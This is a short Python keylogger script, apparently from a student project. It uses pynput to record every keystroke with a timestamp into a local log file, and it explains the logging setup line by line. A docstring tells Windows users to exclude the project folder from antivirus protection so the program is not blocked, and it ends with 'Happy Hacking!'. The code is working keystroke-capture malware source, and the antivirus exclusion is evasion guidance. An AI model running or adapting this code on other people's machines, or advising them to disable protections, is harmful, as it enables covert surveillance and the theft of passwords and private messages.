# Imports
import os
import logging
from pynput.keyboard import Listener
from datetime import datetime

""" 
BEFORE USING THIS PROGRAM:

Use pip to install pynput by pasting the following in your terminal:
pip install pynput

If you are using Windows, ensure the path to this project folder is EXCLUDED from antivirus protection.
This is because this is a key logging program and your anti-virus will usually automatically block it.
If you are using Windows Defender/Windows Security, you can exclude the project directory by going to
Windows Security > Virus & threat protection > Virus & threat protection settings > Manage settings > Exclusions > Add or remove exclusions

If you have any questions or trouble operating this program, you can always reach out to me at zepphen@proton.me.
Happy Hacking!
"""


log_dir = "../Logs" # Variable for path to "Logs" folder

# Logging Configuration
dateAndTime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_filename = f"{dateAndTime}_keyLog.txt"
full_path = os.path.join(log_dir, log_filename)

logging.basicConfig(filename=full_path, level=logging.DEBUG, format='%(asctime)s: %(message)s') # Specifying where to store log file and configuration for the logging
"""
Detailed explanation/breakdown of the line of code above:
We define log_dir as the directory where we want to store
our log files. We obtain the current date and time
using datetime.now() and format it into a string without
any characters that could cause issues in filenames by
using strftime("%Y-%m-%d_%H-%M-%S"). This formatted
string is stored in dateAndTime. We create the full
path to our log file by combining log_dir and the formatted
date and time with a filename using os.path.join(), which
results in full_path. We then configure the logging
system with logging.basicConfig(), specifying the filename
as full_path so logs are saved in the correct location.
We set the level to logging.DEBUG to capture all levels
of log messages, including detailed debug information like
each keystroke. The format parameter is set to
'%(asctime)s: %(message)s' to include a timestamp with each
log entry, allowing us to see exactly when each key was
pressed. This setup ensures that our keylogger records all
keystrokes with precise timestamps and saves them in a
properly formatted log file.
"""

# Logging Main Code
def on_press(key): # Function for every keystroke
    logging.info(str(key)) # Storing the keystroke in the log

with Listener(on_press=on_press) as listener: # Creating listener for on_press
    listener.join()

# Created by Aaban Moiz of the University of Texas at San Antonio,
# Last updated 10/4/23
